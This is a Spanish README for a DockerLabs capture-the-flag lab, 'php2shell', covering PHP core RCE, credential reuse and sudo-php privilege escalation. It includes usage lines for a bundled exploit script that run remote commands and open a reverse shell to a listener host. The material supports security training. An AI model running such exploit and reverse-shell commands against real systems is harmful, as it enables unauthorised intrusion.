# Máquina DockerLabs: PHP2Shell

![DockerLabs](https://img.shields.io/badge/Platform-DockerLabs-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Category](https://img.shields.io/badge/Category-Web%20%2F%20Binary-red)
![CVEs](https://img.shields.io/badge/CVE-2026--109618%20%7C%20CVE-2026--109619-critical)

Laboratorio vulnerable diseñado para la plataforma **[DockerLabs.es](https://dockerlabs.es)** enfocado en la explotación del par de vulnerabilidades críticas del núcleo de PHP conocido como **PHP2Shell**.

---

## 📋 Ficha Técnica

* **Nombre de la máquina:** `php2shell`
* **Dificultad:** Media
* **Sistema Operativo:** Ubuntu 22.04 LTS (x86_64)
* **Dominio asignado:** `php2shell.dl`
* **Dirección IP del laboratorio:** `172.18.0.2`
* **Puntos clave:**
  * Explotación RCE de PHP Core (CVE-2026-109618 / CVE-2026-109619).
  * Enumeración web y buffers multipart.
  * Reutilización de credenciales (Cumplimiento regla Top 5000 de `rockyou.txt`).
  * Escalada de privilegios con GTFOBins (`sudo php`).
* **Flags:**
  * `user.txt`: `/home/mario/user.txt`
  * `root.txt`: `/root/root.txt`

---

## 🚀 Despliegue Local

Para levantar el entorno vulnerable localmente, ejecuta con privilegios de administrador:

```bash
sudo bash auto_deploy.sh
```

El script configurará automáticamente la red Docker (`172.18.0.0/16`), levantará el contenedor con IP `172.18.0.2` y añadirá la entrada `php2shell.dl` a tu `/etc/hosts`.

Para detener y limpiar el laboratorio, presiona `Ctrl+C`.

---

## 🛠️ Herramientas de Prueba y Explotación

En la carpeta `exploit/` dispones del script automatizado en Python:

```bash
# Comprobación de estado
python3 exploit/exploit_php2shell.py -t http://php2shell.dl

# Ejecución de comandos (RCE)
python3 exploit/exploit_php2shell.py -t http://php2shell.dl -c "whoami"

# Reverse Shell interactiva
python3 exploit/exploit_php2shell.py -t http://php2shell.dl --lhost 172.18.0.1 --lport 4444
```

---

## 📦 Empaquetado para Envío a DockerLabs

Para enviar la máquina a los administradores de DockerLabs o publicarla:

```bash
# Generar el archivo comprimido listo para distribución
tar -czvf php2shell.tar.gz Dockerfile auto_deploy.sh entrypoint.sh config/ html/ exploit/ writeup.md README.md
```

Consulta el archivo [writeup.md](file:///home/jay/DESARROLLO/PHP/writeup.md) para ver la solución completa paso a paso.
